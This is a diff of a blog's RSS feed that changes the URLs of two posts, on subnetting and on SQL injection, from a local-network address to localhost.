@@ -2013,8 +2155,8 @@ both for them to see each other’s traffic as they are completely different dep
 To be continued&lt;/p&gt;
 </description>
         <pubDate>Thu, 18 Nov 2021 12:00:00 +0000</pubDate>
-        <link>http://192.168.0.100:5554/2021/11/18/subnetting/</link>
-        <guid isPermaLink="true">http://192.168.0.100:5554/2021/11/18/subnetting/</guid>
+        <link>http://localhost:4000/2021/11/18/subnetting/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/11/18/subnetting/</guid>
         
         <category>subnetting</category>
         
@@ -2673,8 +2815,8 @@ images nor titles etc. Also can not perform error based sqli due to exception ha
 To be continued&lt;/p&gt;
 </description>
         <pubDate>Wed, 13 Oct 2021 10:00:35 +0100</pubDate>
-        <link>http://192.168.0.100:5554/2021/10/13/Sql-injection/</link>
-        <guid isPermaLink="true">http://192.168.0.100:5554/2021/10/13/Sql-injection/</guid>
+        <link>http://localhost:4000/2021/10/13/Sql-injection/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/10/13/Sql-injection/</guid>
         
         <category>sql</category>
         
